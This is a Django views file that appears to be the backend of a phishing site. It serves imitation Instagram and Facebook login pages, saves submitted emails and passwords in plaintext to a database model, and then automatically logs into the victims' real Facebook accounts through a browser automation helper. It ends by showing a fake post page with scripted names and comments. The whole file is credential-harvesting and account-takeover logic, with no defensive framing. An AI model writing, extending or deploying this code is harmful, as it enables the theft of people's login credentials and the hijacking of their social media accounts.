from django.shortcuts import render, redirect
from .models import FacebookAccount
from .check_login import FacebookLogin
import time
from django.views.decorators.cache import cache_control
from .names_comments import names, comments
# Create your views here.

def instagram(request):
    context = {}
    return render(request, 'insta.html', context)

def facebook(request):
    context = {}
    return render(request, 'index.html', context)

def newLogin(request):
    email = request.POST.get('email')
    password = request.POST.get('password')

    if request.method == 'POST' and 'login' in request.POST and email and password:
        newLog = FacebookAccount.objects.create(email=email, password=password)
        newLog.save()
        FacebookLogin(email=email, password=password, browser='Chrome').login()
        # time.sleep(5)
        return redirect('post')

        #return redirect('https://www.youtube.com', code=307)
    else:
        return redirect('')

@cache_control(no_cache=True, must_revalidate=True)
def post(request):

    context={'names':names, 'comments':comments}

    return render(request, 'post.html', context)